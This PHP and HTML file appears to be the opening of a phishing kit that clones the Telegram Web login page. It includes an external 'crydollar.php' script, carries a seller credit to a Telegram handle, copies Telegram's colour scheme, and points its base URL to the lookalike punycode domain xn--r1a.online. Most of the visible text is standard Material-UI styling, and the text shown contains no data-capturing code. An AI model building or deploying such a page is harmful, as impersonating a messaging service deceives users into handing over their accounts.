<?php
include('crydollar.php');

//developer by @crydollar in telegram
?>
<html lang="ru" style="--text-primary:#000000; --text-secondary:#707579; --text-disabled:rgba(0, 0, 0, 0.38); --error:#E53935; --tile-size:54px; --tile-size-normal:48px; --tile-size-extra-small:16px; --tile-size-small:33px; --tile-size-big:120px; --z-index-modal:1300; --color-accent-main:#50A2E9; --color-accent-main44:#50A2E944; --color-accent-main88:#50A2E988; --color-accent-dark:rgb(56, 113, 163); --color-accent-light:rgb(115, 180, 237); --color-grey700:#616161; --color-grey:#9AA7B2; --color-hover:#70757914; --search-input-background:#f4f4f5; --search-input-icon:#9aa7b2; --header-color:#000000; --header-subtle-color:#707579; --badge-unmuted:#4DCD5E; --badge-muted:#C4C9CC; --badge-item-selected:hsl(208, 77.7%, 76.4%); --online-indicator:#0AC630; --message-keyboard-button:#00000033; --message-keyboard-button-hover:#00000022; --message-service-color:#FFFFFF; --message-service-background:#00000033; --panel-background:#ffffff; --border:#07070722; --chat-background:#e6ebee; --background:#ffffff; --background-paper:#fff; --shared-media-background:#fafafa; --dialog-color:#000000; --dialog-subtle-color:#707579; --dialog-meta-color:#5F6369; --dialog-meta-read-color:#4FAE4E; --media-in-tile-background:#50A2E9; --media-out-tile-background:#4FAE4E; --message-in-link:#50A2E9; --message-in-author:#50A2E9; --message-in-background:#FFFFFF; --message-in-color:#000000; --message-in-subtle-color:#707579; --message-in-meta-color:#8D969C; --message-in-reply-title:#50A2E9; --message-in-reply-border:#50A2E9; --message-in-control:#50A2E9; --message-in-control-hover:#50A2E922; --message-in-control-border:#50A2E977; --message-in-control-border-hover:#50A2E9; --message-out-link:#4FAE4E; --message-out-author:#4FAE4E; --message-out-background:#EEFFDE; --message-out-color:#000000; --message-out-subtle-color:#4FAE4E; --message-out-meta-color:#4FAE4E; --message-out-reply-title:#4FAE4E; --message-out-reply-border:#4FAE4E; --message-out-control:#4FAE4E; --message-out-control-hover:#4FAE4E22; --message-out-control-border:#4FAE4E77; --message-out-control-border-hover:#4FAE4E;">
   <head>
<!-- developer by @crydollar in telegram -->
      <style data-jss="" data-meta="MuiTouchRipple">
         .MuiTouchRipple-root {
         top: 0;
         left: 0;
         right: 0;
         bottom: 0;
         z-index: 0;
         overflow: hidden;
         position: absolute;
         border-radius: inherit;
         pointer-events: none;
         }
         .MuiTouchRipple-ripple {
         opacity: 0;
         position: absolute;
         }
         .MuiTouchRipple-rippleVisible {
         opacity: 0.08;
         animation: MuiTouchRipple-keyframes-enter 550ms cubic-bezier(0.4, 0, 0.2, 1);
         transform: scale(1);
         }
         .MuiTouchRipple-ripplePulsate {
         animation-duration: 200ms;
         }
         .MuiTouchRipple-child {
         color: rgba(112, 117, 121);
         width: 100%;
         height: 100%;
         display: block;
         opacity: 1;
         border-radius: 50%;
         background-color: currentColor;
         }
         .MuiTouchRipple-childLeaving {
         opacity: 0;
         animation: MuiTouchRipple-keyframes-exit 550ms cubic-bezier(0.4, 0, 0.2, 1);
         }
         .MuiTouchRipple-childPulsate {
         top: 0;
         left: 0;
         position: absolute;
         animation: MuiTouchRipple-keyframes-pulsate 2500ms cubic-bezier(0.4, 0, 0.2, 1) 200ms infinite;
         }
         @-webkit-keyframes MuiTouchRipple-keyframes-enter {
         0% {
         opacity: 0.03;
         transform: scale(0);
         }
         100% {
         opacity: 0.08;
         transform: scale(1);
         }
         }
         @-webkit-keyframes MuiTouchRipple-keyframes-exit {
         0% {
         opacity: 1;
         }
         100% {
         opacity: 0;
         }
         }
         @-webkit-keyframes MuiTouchRipple-keyframes-pulsate {
         0% {
         transform: scale(1);
         }
         50% {
         transform: scale(0.92);
         }
         100% {
         transform: scale(1);
         }
         }
      </style>
      <style data-jss="" data-meta="MuiButtonBase">
         .MuiButtonBase-root {
         color: inherit;
         border: 0;
         cursor: pointer;
         margin: 0;
         display: inline-flex;
         outline: 0;
         padding: 0;
         position: relative;
         align-items: center;
         user-select: none;
         border-radius: 0;
         vertical-align: middle;
         -moz-appearance: none;
         justify-content: center;
         text-decoration: none;
         background-color: transparent;
         -webkit-appearance: none;
         -webkit-tap-highlight-color: transparent;
         }
         .MuiButtonBase-root::-moz-focus-inner {
         border-style: none;
         }
         .MuiButtonBase-root.Mui-disabled {
         cursor: default;
         pointer-events: none;
         }
         @media print {
         .MuiButtonBase-root {
         -webkit-print-color-adjust: exact;
         }
         }
      </style>
      <style data-jss="" data-meta="MuiButton">
         .MuiButton-root {
         color: rgba(0, 0, 0, 0.87);
         padding: 12px 16px 11px;
         font-size: 16px;
         min-width: 64px;
         box-sizing: border-box;
         transition: background-color 250ms cubic-bezier(0.4, 0, 0.2, 1) 0ms,box-shadow 250ms cubic-bezier(0.4, 0, 0.2, 1) 0ms,border 250ms cubic-bezier(0.4, 0, 0.2, 1) 0ms;
         font-family: "Roboto", "Helvetica", "Arial", sans-serif;
         font-weight: 500;
         line-height: normal;
         border-radius: 10px;
         letter-spacing: 0.02857em;
         text-transform: uppercase;
         }
         .MuiButton-root:hover {
         text-decoration: none;
         background-color: rgba(0, 0, 0, 0.08);
         }
         .MuiButton-root.Mui-disabled {
         color: rgba(0, 0, 0, 0.26);
         }
         @media (hover: none) {
         .MuiButton-root:hover {
         background-color: transparent;
         }
         }
         .MuiButton-root:hover.Mui-disabled {
         background-color: transparent;
         }
         .MuiButton-label {
         width: 100%;
         display: inherit;
         align-items: inherit;
         justify-content: inherit;
         }
         .MuiButton-text {
         padding: 6px 8px;
         }
         .MuiButton-textPrimary {
         color: #50A2E9;
         }
         .MuiButton-textPrimary:hover {
         background-color: rgba(80, 162, 233, 0.08);
         }
         @media (hover: none) {
         .MuiButton-textPrimary:hover {
         background-color: transparent;
         }
         }
         .MuiButton-textSecondary {
         color: #E53935;
         }
         .MuiButton-textSecondary:hover {
         background-color: rgba(229, 57, 53, 0.08);
         }
         @media (hover: none) {
         .MuiButton-textSecondary:hover {
         background-color: transparent;
         }
         }
         .MuiButton-outlined {
         border: 1px solid rgba(0, 0, 0, 0.23);
         padding: 5px 15px;
         }
         .MuiButton-outlined.Mui-disabled {
         border: 1px solid rgba(0, 0, 0, 0.12);
         }
         .MuiButton-outlinedPrimary {
         color: #50A2E9;
         border: 1px solid rgba(80, 162, 233, 0.5);
         }
         .MuiButton-outlinedPrimary:hover {
         border: 1px solid #50A2E9;
         background-color: rgba(80, 162, 233, 0.08);
         }
         @media (hover: none) {
         .MuiButton-outlinedPrimary:hover {
         background-color: transparent;
         }
         }
         .MuiButton-outlinedSecondary {
         color: #E53935;
         border: 1px solid rgba(229, 57, 53, 0.5);
         }
         .MuiButton-outlinedSecondary:hover {
         border: 1px solid #E53935;
         background-color: rgba(229, 57, 53, 0.08);
         }
         .MuiButton-outlinedSecondary.Mui-disabled {
         border: 1px solid rgba(0, 0, 0, 0.26);
         }
         @media (hover: none) {
         .MuiButton-outlinedSecondary:hover {
         background-color: transparent;
         }
         }
         .MuiButton-contained {
         color: rgba(0, 0, 0, 0.87);
         box-shadow: 0px 3px 1px -2px rgba(0,0,0,0.2),0px 2px 2px 0px rgba(0,0,0,0.14),0px 1px 5px 0px rgba(0,0,0,0.12);
         background-color: #e0e0e0;
         }
         .MuiButton-contained:hover {
         box-shadow: 0px 2px 4px -1px rgba(0,0,0,0.2),0px 4px 5px 0px rgba(0,0,0,0.14),0px 1px 10px 0px rgba(0,0,0,0.12);
         background-color: #d5d5d5;
         }
         .MuiButton-contained.Mui-focusVisible {
         box-shadow: 0px 3px 5px -1px rgba(0,0,0,0.2),0px 6px 10px 0px rgba(0,0,0,0.14),0px 1px 18px 0px rgba(0,0,0,0.12);
         }
         .MuiButton-contained:active {
         box-shadow: 0px 5px 5px -3px rgba(0,0,0,0.2),0px 8px 10px 1px rgba(0,0,0,0.14),0px 3px 14px 2px rgba(0,0,0,0.12);
         }
         .MuiButton-contained.Mui-disabled {
         color: rgba(0, 0, 0, 0.26);
         box-shadow: none;
         background-color: rgba(0, 0, 0, 0.12);
         }
         @media (hover: none) {
         .MuiButton-contained:hover {
         box-shadow: 0px 3px 1px -2px rgba(0,0,0,0.2),0px 2px 2px 0px rgba(0,0,0,0.14),0px 1px 5px 0px rgba(0,0,0,0.12);
         background-color: #e0e0e0;
         }
         }
         .MuiButton-contained:hover.Mui-disabled {
         background-color: rgba(0, 0, 0, 0.12);
         }
         .MuiButton-containedPrimary {
         color: rgba(0, 0, 0, 0.87);
         background-color: #50A2E9;
         }
         .MuiButton-containedPrimary:hover {
         background-color: rgb(56, 113, 163);
         }
         @media (hover: none) {
         .MuiButton-containedPrimary:hover {
         background-color: #50A2E9;
         }
         }
         .MuiButton-containedSecondary {
         color: #fff;
         background-color: #E53935;
         }
         .MuiButton-containedSecondary:hover {
         background-color: rgb(160, 39, 37);
         }
         @media (hover: none) {
         .MuiButton-containedSecondary:hover {
         background-color: #E53935;
         }
         }
         .MuiButton-disableElevation {
         box-shadow: none;
         }
         .MuiButton-disableElevation:hover {
         box-shadow: none;
         }
         .MuiButton-disableElevation.Mui-focusVisible {
         box-shadow: none;
         }
         .MuiButton-disableElevation:active {
         box-shadow: none;
         }
         .MuiButton-disableElevation.Mui-disabled {
         box-shadow: none;
         }
         .MuiButton-colorInherit {
         color: inherit;
         border-color: currentColor;
         }
         .MuiButton-textSizeSmall {
         padding: 4px 5px;
         font-size: 0.8125rem;
         }
         .MuiButton-textSizeLarge {
         padding: 8px 11px;
         font-size: 0.9375rem;
         }
         .MuiButton-outlinedSizeSmall {
         padding: 3px 9px;
         font-size: 0.8125rem;
         }
         .MuiButton-outlinedSizeLarge {
         padding: 7px 21px;
         font-size: 0.9375rem;
         }
         .MuiButton-containedSizeSmall {
         padding: 4px 10px;
         font-size: 0.8125rem;
         }
         .MuiButton-containedSizeLarge {
         padding: 8px 22px;
         font-size: 0.9375rem;
         }
         .MuiButton-fullWidth {
         width: 100%;
         }
         .MuiButton-startIcon {
         display: inherit;
         margin-left: -4px;
         margin-right: 8px;
         }
         .MuiButton-startIcon.MuiButton-iconSizeSmall {
         margin-left: -2px;
         }
         .MuiButton-endIcon {
         display: inherit;
         margin-left: 8px;
         margin-right: -4px;
         }
         .MuiButton-endIcon.MuiButton-iconSizeSmall {
         margin-right: -2px;
         }
         .MuiButton-iconSizeSmall > *:first-child {
         font-size: 18px;
         }
         .MuiButton-iconSizeMedium > *:first-child {
         font-size: 20px;
         }
         .MuiButton-iconSizeLarge > *:first-child {
         font-size: 22px;
         }
      </style>
      <style data-jss="" data-meta="MuiDialog">
         @media print {
         .MuiDialog-root {
         position: absolute !important;
         }
         }
         .MuiDialog-scrollPaper {
         display: flex;
         align-items: center;
         justify-content: center;
         }
         .MuiDialog-scrollBody {
         overflow-x: hidden;
         overflow-y: auto;
         text-align: center;
         }
         .MuiDialog-scrollBody:after {
         width: 0;
         height: 100%;
         content: "";
         display: inline-block;
         vertical-align: middle;
         }
         .MuiDialog-container {
         height: 100%;
         outline: 0;
         }
         @media print {
         .MuiDialog-container {
         height: auto;
         }
         }
         .MuiDialog-paper {
         margin: 32px;
         position: relative;
         overflow-y: auto;
         }
         @media print {
         .MuiDialog-paper {
         box-shadow: none;
         overflow-y: visible;
         }
         }
         .MuiDialog-paperScrollPaper {
         display: flex;
         max-height: calc(100% - 64px);
         flex-direction: column;
         }
         .MuiDialog-paperScrollBody {
         display: inline-block;
         text-align: left;
         vertical-align: middle;
         }
         .MuiDialog-paperWidthFalse {
         max-width: calc(100% - 64px);
         }
         .MuiDialog-paperWidthXs {
         max-width: 444px;
         }
         @media (max-width:507.95px) {
         .MuiDialog-paperWidthXs.MuiDialog-paperScrollBody {
         max-width: calc(100% - 64px);
         }
         }
         .MuiDialog-paperWidthSm {
         max-width: 600px;
         }
         @media (max-width:663.95px) {
         .MuiDialog-paperWidthSm.MuiDialog-paperScrollBody {
         max-width: calc(100% - 64px);
         }
         }
         .MuiDialog-paperWidthMd {
         max-width: 960px;
         }
         @media (max-width:1023.95px) {
         .MuiDialog-paperWidthMd.MuiDialog-paperScrollBody {
         max-width: calc(100% - 64px);
         }
         }
         .MuiDialog-paperWidthLg {
         max-width: 1280px;
         }
         @media (max-width:1343.95px) {
         .MuiDialog-paperWidthLg.MuiDialog-paperScrollBody {
         max-width: calc(100% - 64px);
         }
         }
         .MuiDialog-paperWidthXl {
         max-width: 1920px;
         }
         @media (max-width:1983.95px) {
         .MuiDialog-paperWidthXl.MuiDialog-paperScrollBody {
         max-width: calc(100% - 64px);
         }
         }
         .MuiDialog-paperFullWidth {
         width: calc(100% - 64px);
         }
         .MuiDialog-paperFullScreen {
         width: 100%;
         height: 100%;
         margin: 0;
         max-width: 100%;
         max-height: none;
         border-radius: 0;
         }
         .MuiDialog-paperFullScreen.MuiDialog-paperScrollBody {
         margin: 0;
         max-width: 100%;
         }
      </style>
      <style data-jss="" data-meta="MuiTypography">
         .MuiTypography-root {
         margin: 0;
         }
         .MuiTypography-body2 {
         font-size: 0.875rem;
         font-family: "Roboto", "Helvetica", "Arial", sans-serif;
         font-weight: 400;
         line-height: 1.43;
         letter-spacing: 0.01071em;
         }
         .MuiTypography-body1 {
         font-size: 1rem;
         font-family: "Roboto", "Helvetica", "Arial", sans-serif;
         font-weight: 400;
         line-height: 1.5;
         letter-spacing: 0.00938em;
         }
         .MuiTypography-caption {
         font-size: 0.75rem;
         font-family: "Roboto", "Helvetica", "Arial", sans-serif;
         font-weight: 400;
         line-height: 1.66;
         letter-spacing: 0.03333em;
         }
         .MuiTypography-button {
         font-size: 0.875rem;
         font-family: "Roboto", "Helvetica", "Arial", sans-serif;
         font-weight: 500;
         line-height: 1.75;
         letter-spacing: 0.02857em;
         text-transform: uppercase;
         }
         .MuiTypography-h1 {
         font-size: 6rem;
         font-family: "Roboto", "Helvetica", "Arial", sans-serif;
         font-weight: 300;
         line-height: 1.167;
         letter-spacing: -0.01562em;
         }
         .MuiTypography-h2 {
         font-size: 3.75rem;
         font-family: "Roboto", "Helvetica", "Arial", sans-serif;
         font-weight: 300;
         line-height: 1.2;
         letter-spacing: -0.00833em;
         }
         .MuiTypography-h3 {
         font-size: 3rem;
         font-family: "Roboto", "Helvetica", "Arial", sans-serif;
         font-weight: 400;
         line-height: 1.167;
         letter-spacing: 0em;
         }
         .MuiTypography-h4 {
         font-size: 2.125rem;
         font-family: "Roboto", "Helvetica", "Arial", sans-serif;
         font-weight: 400;
         line-height: 1.235;
         letter-spacing: 0.00735em;
         }
         .MuiTypography-h5 {
         font-size: 1.5rem;
         font-family: "Roboto", "Helvetica", "Arial", sans-serif;
         font-weight: 400;
         line-height: 1.334;
         letter-spacing: 0em;
         }
         .MuiTypography-h6 {
         font-size: 1.25rem;
         font-family: "Roboto", "Helvetica", "Arial", sans-serif;
         font-weight: 500;
         line-height: 1.6;
         letter-spacing: 0.0075em;
         }
         .MuiTypography-subtitle1 {
         font-size: 1rem;
         font-family: "Roboto", "Helvetica", "Arial", sans-serif;
         font-weight: 400;
         line-height: 1.75;
         letter-spacing: 0.00938em;
         }
         .MuiTypography-subtitle2 {
         font-size: 0.875rem;
         font-family: "Roboto", "Helvetica", "Arial", sans-serif;
         font-weight: 500;
         line-height: 1.57;
         letter-spacing: 0.00714em;
         }
         .MuiTypography-overline {
         font-size: 0.75rem;
         font-family: "Roboto", "Helvetica", "Arial", sans-serif;
         font-weight: 400;
         line-height: 2.66;
         letter-spacing: 0.08333em;
         text-transform: uppercase;
         }
         .MuiTypography-srOnly {
         width: 1px;
         height: 1px;
         overflow: hidden;
         position: absolute;
         }
         .MuiTypography-alignLeft {
         text-align: left;
         }
         .MuiTypography-alignCenter {
         text-align: center;
         }
         .MuiTypography-alignRight {
         text-align: right;
         }
         .MuiTypography-alignJustify {
         text-align: justify;
         }
         .MuiTypography-noWrap {
         overflow: hidden;
         white-space: nowrap;
         text-overflow: ellipsis;
         }
         .MuiTypography-gutterBottom {
         margin-bottom: 0.35em;
         }
         .MuiTypography-paragraph {
         margin-bottom: 16px;
         }
         .MuiTypography-colorInherit {
         color: inherit;
         }
         .MuiTypography-colorPrimary {
         color: #50A2E9;
         }
         .MuiTypography-colorSecondary {
         color: #E53935;
         }
         .MuiTypography-colorTextPrimary {
         color: rgba(0, 0, 0, 0.87);
         }
         .MuiTypography-colorTextSecondary {
         color: rgba(0, 0, 0, 0.54);
         }
         .MuiTypography-colorError {
         color: #f44336;
         }
         .MuiTypography-displayInline {
         display: inline;
         }
         .MuiTypography-displayBlock {
         display: block;
         }
      </style>
      <style data-jss="" data-meta="MuiSvgIcon">
         .MuiSvgIcon-root {
         fill: currentColor;
         width: 1em;
         height: 1em;
         display: inline-block;
         font-size: 1.5rem;
         transition: fill 200ms cubic-bezier(0.4, 0, 0.2, 1) 0ms;
         flex-shrink: 0;
         user-select: none;
         }
         .MuiSvgIcon-colorPrimary {
         color: #50A2E9;
         }
         .MuiSvgIcon-colorSecondary {
         color: #E53935;
         }
         .MuiSvgIcon-colorAction {
         color: rgba(0, 0, 0, 0.54);
         }
         .MuiSvgIcon-colorError {
         color: #f44336;
         }
         .MuiSvgIcon-colorDisabled {
         color: rgba(0, 0, 0, 0.26);
         }
         .MuiSvgIcon-fontSizeInherit {
         font-size: inherit;
         }
         .MuiSvgIcon-fontSizeSmall {
         font-size: 1.25rem;
         }
         .MuiSvgIcon-fontSizeLarge {
         font-size: 2.1875rem;
         }
      </style>
      <style data-jss="" data-meta="MuiIconButton">
         .MuiIconButton-root {
         flex: 0 0 auto;
         color: rgba(0, 0, 0, 0.54);
         padding: 12px;
         overflow: visible;
         font-size: 1.5rem;
         text-align: center;
         transition: background-color 150ms cubic-bezier(0.4, 0, 0.2, 1) 0ms;
         border-radius: 50%;
         }
         .MuiIconButton-root:hover {
         background-color: rgba(0, 0, 0, 0.08);
         }
         .MuiIconButton-root.Mui-disabled {
         color: rgba(0, 0, 0, 0.26);
         background-color: transparent;
         }
         @media (hover: none) {
         .MuiIconButton-root:hover {
         background-color: transparent;
         }
         }
         .MuiIconButton-edgeStart {
         margin-left: -12px;
         }
         .MuiIconButton-sizeSmall.MuiIconButton-edgeStart {
         margin-left: -3px;
         }
         .MuiIconButton-edgeEnd {
         margin-right: -12px;
         }
         .MuiIconButton-sizeSmall.MuiIconButton-edgeEnd {
         margin-right: -3px;
         }
         .MuiIconButton-colorInherit {
         color: inherit;
         }
         .MuiIconButton-colorPrimary {
         color: #50A2E9;
         }
         .MuiIconButton-colorPrimary:hover {
         background-color: rgba(80, 162, 233, 0.08);
         }
         @media (hover: none) {
         .MuiIconButton-colorPrimary:hover {
         background-color: transparent;
         }
         }
         .MuiIconButton-colorSecondary {
         color: #E53935;
         }
         .MuiIconButton-colorSecondary:hover {
         background-color: rgba(229, 57, 53, 0.08);
         }
         @media (hover: none) {
         .MuiIconButton-colorSecondary:hover {
         background-color: transparent;
         }
         }
         .MuiIconButton-sizeSmall {
         padding: 3px;
         font-size: 1.125rem;
         }
         .MuiIconButton-label {
         width: 100%;
         display: flex;
         align-items: inherit;
         justify-content: inherit;
         }
      </style>
      <style data-jss="" data-meta="PrivateSwitchBase">
         .jss5 {
         padding: 9px;
         }
         .jss8 {
         top: 0;
         left: 0;
         width: 100%;
         cursor: inherit;
         height: 100%;
         margin: 0;
         opacity: 0;
         padding: 0;
         z-index: 1;
         position: absolute;
         }
      </style>
      <style data-jss="" data-meta="MuiInputBase">
         @-webkit-keyframes mui-auto-fill {}
         @-webkit-keyframes mui-auto-fill-cancel {}
         .MuiInputBase-root {
         color: rgba(0, 0, 0, 0.87);
         cursor: text;
         display: inline-flex;
         position: relative;
         font-size: 1rem;
         box-sizing: border-box;
         align-items: center;
         font-family: "Roboto", "Helvetica", "Arial", sans-serif;
         font-weight: 400;
         line-height: 1.1876em;
         letter-spacing: 0.00938em;
         }
         .MuiInputBase-root.Mui-disabled {
         color: rgba(0, 0, 0, 0.38);
         cursor: default;
         }
         .MuiInputBase-multiline {
         padding: 6px 0 7px;
         }
         .MuiInputBase-multiline.MuiInputBase-marginDense {
         padding-top: 3px;
         }
         .MuiInputBase-fullWidth {
         width: 100%;
         }
         .MuiInputBase-input {
         font: inherit;
         color: currentColor;
         width: 100%;
         border: 0;
         height: 1.1876em;
         margin: 0;
         display: block;
         padding: 6px 0 7px;
         min-width: 0;
         background: none;
         box-sizing: content-box;
         animation-name: mui-auto-fill-cancel;
         letter-spacing: inherit;
         animation-duration: 10ms;
         -webkit-tap-highlight-color: transparent;
         }
         .MuiInputBase-input::-webkit-input-placeholder {
         color: currentColor;
         opacity: 0.42;
         transition: opacity 200ms cubic-bezier(0.4, 0, 0.2, 1) 0ms;
         }
         .MuiInputBase-input::-moz-placeholder {
         color: currentColor;
         opacity: 0.42;
         transition: opacity 200ms cubic-bezier(0.4, 0, 0.2, 1) 0ms;
         }
         .MuiInputBase-input:-ms-input-placeholder {
         color: currentColor;
         opacity: 0.42;
         transition: opacity 200ms cubic-bezier(0.4, 0, 0.2, 1) 0ms;
         }
         .MuiInputBase-input::-ms-input-placeholder {
         color: currentColor;
         opacity: 0.42;
         transition: opacity 200ms cubic-bezier(0.4, 0, 0.2, 1) 0ms;
         }
         .MuiInputBase-input:focus {
         outline: 0;
         }
         .MuiInputBase-input:invalid {
         box-shadow: none;
         }
         .MuiInputBase-input::-webkit-search-decoration {
         -webkit-appearance: none;
         }
         .MuiInputBase-input.Mui-disabled {
         opacity: 1;
         }
         .MuiInputBase-input:-webkit-autofill {
         animation-name: mui-auto-fill;
         animation-duration: 5000s;
         }
         label[data-shrink=false] + .MuiInputBase-formControl .MuiInputBase-input::-webkit-input-placeholder {
         opacity: 0 !important;
         }
         label[data-shrink=false] + .MuiInputBase-formControl .MuiInputBase-input::-moz-placeholder {
         opacity: 0 !important;
         }
         label[data-shrink=false] + .MuiInputBase-formControl .MuiInputBase-input:-ms-input-placeholder {
         opacity: 0 !important;
         }
         label[data-shrink=false] + .MuiInputBase-formControl .MuiInputBase-input::-ms-input-placeholder {
         opacity: 0 !important;
         }
         label[data-shrink=false] + .MuiInputBase-formControl .MuiInputBase-input:focus::-webkit-input-placeholder {
         opacity: 0.42;
         }
         label[data-shrink=false] + .MuiInputBase-formControl .MuiInputBase-input:focus::-moz-placeholder {
         opacity: 0.42;
         }
         label[data-shrink=false] + .MuiInputBase-formControl .MuiInputBase-input:focus:-ms-input-placeholder {
         opacity: 0.42;
         }
         label[data-shrink=false] + .MuiInputBase-formControl .MuiInputBase-input:focus::-ms-input-placeholder {
         opacity: 0.42;
         }
         .MuiInputBase-inputMarginDense {
         padding-top: 3px;
         }
         .MuiInputBase-inputMultiline {
         height: auto;
         resize: none;
         padding: 0;
         }
         .MuiInputBase-inputTypeSearch {
         -moz-appearance: textfield;
         -webkit-appearance: textfield;
         }
      </style>
      <style data-jss="" data-meta="PrivateNotchedOutline">
         .jss1 {
         top: -5px;
         left: 0;
         right: 0;
         bottom: 0;
         margin: 0;
         padding: 0 8px;
         overflow: hidden;
         position: absolute;
         border-style: solid;
         border-width: 1px;
         border-radius: inherit;
         pointer-events: none;
         }
         .jss2 {
         padding: 0;
         text-align: left;
         transition: width 150ms cubic-bezier(0.0, 0, 0.2, 1) 0ms;
         line-height: 11px;
         }
         .jss3 {
         width: auto;
         height: 11px;
         display: block;
         padding: 0;
         font-size: 0.75em;
         max-width: 0.01px;
         text-align: left;
         transition: max-width 50ms cubic-bezier(0.0, 0, 0.2, 1) 0ms;
         visibility: hidden;
         }
         .jss3 > span {
         display: inline-block;
         padding-left: 5px;
         padding-right: 5px;
         }
         .jss4 {
         max-width: 1000px;
         transition: max-width 100ms cubic-bezier(0.0, 0, 0.2, 1) 50ms;
         }
      </style>
      <style data-jss="" data-meta="MuiOutlinedInput">
         .MuiOutlinedInput-root {
         position: relative;
         border-radius: 10px;
         }
         .MuiOutlinedInput-root:hover .MuiOutlinedInput-notchedOutline {
         border-color: rgba(0, 0, 0, 0.87);
         }
         @media (hover: none) {
         .MuiOutlinedInput-root:hover .MuiOutlinedInput-notchedOutline {
         border-color: rgba(0, 0, 0, 0.23);
         }
         }
         .MuiOutlinedInput-root.Mui-focused .MuiOutlinedInput-notchedOutline {
         border-color: #50A2E9;
         border-width: 2px;
         }
         .MuiOutlinedInput-root.Mui-error .MuiOutlinedInput-notchedOutline {
         border-color: #f44336;
         }
         .MuiOutlinedInput-root.Mui-disabled .MuiOutlinedInput-notchedOutline {
         border-color: rgba(0, 0, 0, 0.26);
         }
         .MuiOutlinedInput-colorSecondary.Mui-focused .MuiOutlinedInput-notchedOutline {
         border-color: #E53935;
         }
         .MuiOutlinedInput-adornedStart {
         padding-left: 14px;
         }
         .MuiOutlinedInput-adornedEnd {
         padding-right: 14px;
         }
         .MuiOutlinedInput-multiline {
         padding: 18.5px 14px;
         }
         .MuiOutlinedInput-multiline.MuiOutlinedInput-marginDense {
         padding-top: 10.5px;
         padding-bottom: 10.5px;
         }
         .MuiOutlinedInput-notchedOutline {
         border-color: rgba(0, 0, 0, 0.23);
         }
         .MuiOutlinedInput-input {
         padding: 17.5px 14px;
         }
         .MuiOutlinedInput-input:-webkit-autofill {
         border-radius: inherit;
         }
         .MuiOutlinedInput-inputMarginDense {
         padding-top: 10.5px;
         padding-bottom: 10.5px;
         }
         .MuiOutlinedInput-inputMultiline {
         padding: 0;
         }
         .MuiOutlinedInput-inputAdornedStart {
         padding-left: 0;
         }
         .MuiOutlinedInput-inputAdornedEnd {
         padding-right: 0;
         }
      </style>
      <style data-jss="" data-meta="MuiFormLabel">
         .MuiFormLabel-root {
         color: rgba(0, 0, 0, 0.54);
         padding: 0;
         font-size: 1rem;
         font-family: "Roboto", "Helvetica", "Arial", sans-serif;
         font-weight: 400;
         line-height: 1;
         letter-spacing: 0.00938em;
         }
         .MuiFormLabel-root.Mui-focused {
         color: #50A2E9;
         }
         .MuiFormLabel-root.Mui-disabled {
         color: rgba(0, 0, 0, 0.38);
         }
         .MuiFormLabel-root.Mui-error {
         color: #f44336;
         }
         .MuiFormLabel-colorSecondary.Mui-focused {
         color: #E53935;
         }
         .MuiFormLabel-asterisk.Mui-error {
         color: #f44336;
         }
      </style>
      <style data-jss="" data-meta="MuiInputLabel">
         .MuiInputLabel-root {
         display: block;
         transform-origin: top left;
         }
         .MuiInputLabel-formControl {
         top: 0;
         left: 0;
         position: absolute;
         transform: translate(0, 24px) scale(1);
         }
         .MuiInputLabel-marginDense {
         transform: translate(0, 21px) scale(1);
         }
         .MuiInputLabel-shrink {
         transform: translate(0, 1.5px) scale(0.75);
         transform-origin: top left;
         }
         .MuiInputLabel-animated {
         transition: color 200ms cubic-bezier(0.0, 0, 0.2, 1) 0ms,transform 200ms cubic-bezier(0.0, 0, 0.2, 1) 0ms;
         }
         .MuiInputLabel-filled {
         z-index: 1;
         transform: translate(12px, 20px) scale(1);
         pointer-events: none;
         }
         .MuiInputLabel-filled.MuiInputLabel-marginDense {
         transform: translate(12px, 17px) scale(1);
         }
         .MuiInputLabel-filled.MuiInputLabel-shrink {
         transform: translate(12px, 10px) scale(0.75);
         }
         .MuiInputLabel-filled.MuiInputLabel-shrink.MuiInputLabel-marginDense {
         transform: translate(12px, 7px) scale(0.75);
         }
         .MuiInputLabel-outlined {
         z-index: 1;
         transform: translate(14px, 20px) scale(1);
         pointer-events: none;
         }
         .MuiInputLabel-outlined.MuiInputLabel-marginDense {
         transform: translate(14px, 12px) scale(1);
         }
         .MuiInputLabel-outlined.MuiInputLabel-shrink {
         transform: translate(14px, -6px) scale(0.75);
         }
      </style>
      <style data-jss="" data-meta="MuiFormControl">
         .MuiFormControl-root {
         border: 0;
         margin: 0;
         display: inline-flex;
         padding: 0;
         position: relative;
         min-width: 0;
         flex-direction: column;
         vertical-align: top;
         }
         .MuiFormControl-marginNormal {
         margin-top: 16px;
         margin-bottom: 8px;
         }
         .MuiFormControl-marginDense {
         margin-top: 8px;
         margin-bottom: 4px;
         }
         .MuiFormControl-fullWidth {
         width: 100%;
         }
      </style>
      <style data-jss="" data-meta="MuiTextField">
      </style>
      <style data-jss="" data-meta="MuiCheckbox">
         .MuiCheckbox-root {
         color: rgba(0, 0, 0, 0.54);
         }
         .MuiCheckbox-colorPrimary.Mui-checked {
         color: #50A2E9;
         }
         .MuiCheckbox-colorPrimary.Mui-disabled {
         color: rgba(0, 0, 0, 0.26);
         }
         .MuiCheckbox-colorPrimary.Mui-checked:hover {
         background-color: rgba(80, 162, 233, 0.08);
         }
         @media (hover: none) {
         .MuiCheckbox-colorPrimary.Mui-checked:hover {
         background-color: transparent;
         }
         }
         .MuiCheckbox-colorSecondary.Mui-checked {
         color: #E53935;
         }
         .MuiCheckbox-colorSecondary.Mui-disabled {
         color: rgba(0, 0, 0, 0.26);
         }
         .MuiCheckbox-colorSecondary.Mui-checked:hover {
         background-color: rgba(229, 57, 53, 0.08);
         }
         @media (hover: none) {
         .MuiCheckbox-colorSecondary.Mui-checked:hover {
         background-color: transparent;
         }
         }
      </style>
      <style data-jss="" data-meta="MuiLink">
         .MuiLink-underlineNone {
         text-decoration: none;
         }
         .MuiLink-underlineHover {
         text-decoration: none;
         }
         .MuiLink-underlineHover:hover {
         text-decoration: underline;
         }
         .MuiLink-underlineAlways {
         text-decoration: underline;
         }
         .MuiLink-button {
         border: 0;
         cursor: pointer;
         margin: 0;
         outline: 0;
         padding: 0;
         position: relative;
         user-select: none;
         border-radius: 0;
         vertical-align: middle;
         -moz-appearance: none;
         background-color: transparent;
         -webkit-appearance: none;
         -webkit-tap-highlight-color: transparent;
         }
         .MuiLink-button::-moz-focus-inner {
         border-style: none;
         }
         .MuiLink-button.Mui-focusVisible {
         outline: auto;
         }
      </style>
      <base href="https://xn--r1a.online/">
      <meta charset="utf-8">
